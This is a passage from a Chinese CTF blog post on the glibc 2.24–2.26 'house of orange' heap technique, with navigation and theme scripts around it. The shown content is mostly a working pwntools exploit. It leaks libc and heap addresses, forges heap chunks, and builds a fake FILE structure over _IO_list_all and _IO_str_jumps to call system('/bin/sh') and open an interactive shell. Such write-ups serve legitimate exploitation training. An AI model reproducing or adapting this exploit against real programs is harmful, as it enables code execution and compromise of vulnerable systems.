class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span><br>show()<br>io.recv(<span class="hljs-number">1</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - (<span class="hljs-number">0x000076ec9e399b58</span> - <span class="hljs-number">0x76ec9e399af0</span>) - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>_IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>))<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_IO_str_jumps</span>():<br>   IO_file_jumps_offset = libc.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>   IO_str_underflow_offset = libc.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>   <span class="hljs-keyword">for</span> ref_offset <span class="hljs-keyword">in</span> libc.search(p64(IO_str_underflow_offset)):<br>       possible_IO_str_jumps_offset = ref_offset - <span class="hljs-number">0x20</span><br>       <span class="hljs-keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:<br>          success(<span class="hljs-string">&#x27;_IO_str_jumps----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(possible_IO_str_jumps_offset))<br>          <span class="hljs-keyword">return</span> possible_IO_str_jumps_offset<br><br><br><br><br><br>_IO_str_jumps = libc_base + get_IO_str_jumps()<br>success(<span class="hljs-string">&#x27;_IO_file_jumps----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(_IO_str_jumps))<br>pause()<br>add(<span class="hljs-number">0x400</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>gdb.attach(io)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>) <span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x90</span>)<br>add(<span class="hljs-number">0x80</span>)<br><br>show()<br>io.recvuntil(<span class="hljs-string">&#x27;\x20&#x27;</span>)<br>heap_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0xb0</span><br>success(<span class="hljs-string">&#x27;heap_addr-----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_addr))<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br><br>fake_chunk = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span><br>fake_chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x1E1</span>)<br>fake_chunk += p64(heap_addr + <span class="hljs-number">0x50</span>)*<span class="hljs-number">2</span><br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x1E0</span>)<br><br>edit(fake_chunk)<br><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br><br>edit(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x270</span>))<br>free(<span class="hljs-number">2</span>)<br>gdb.attach(io)<br>add(<span class="hljs-number">0x290</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x1d0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) +<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x290</span>) <span class="hljs-comment">#1</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x91</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x151</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(payload)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x290</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span> <br>file = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x61</span>) + p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x10</span>) <br>file += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">110</span>) +p64(<span class="hljs-number">0xdeadbeef</span>) + p64(binsh) <br>file = file.ljust(<span class="hljs-number">0xD8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>file += p64(_IO_str_jumps - <span class="hljs-number">0x8</span>) <br>file +=  p64(<span class="hljs-number">0</span>) + p64(system) +<span class="hljs-string">b&#x27;\n&#x27;</span><br>payload += file<br>edit(payload)<br>add(<span class="hljs-number">0x90</span>)<br><br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104390952">攻防世界PWN之bufoverflow_a题解(house of orange in 2.24&amp;house of Einherjar)_pwn houseoforange 2.24bypass-CSDN博客</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>glibc.2.24-2.26——house of orange</div>
+      <div>https://ch13hh.github.io/2024/08/01/glibc.2.24-2.26——house of orange/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/" title="DASCTF2022.07赋能赛PWN部分WP">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DASCTF2022.07赋能赛PWN部分WP</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/" title="DASCTF X GFCTF 2022十月挑战赛-PWN-WP">
+                        <span class="hidden-mobile">DASCTF X GFCTF 2022十月挑战赛-PWN-WP</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","appKey":"idRJngxDPrsuLA4G1dKyEewP","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
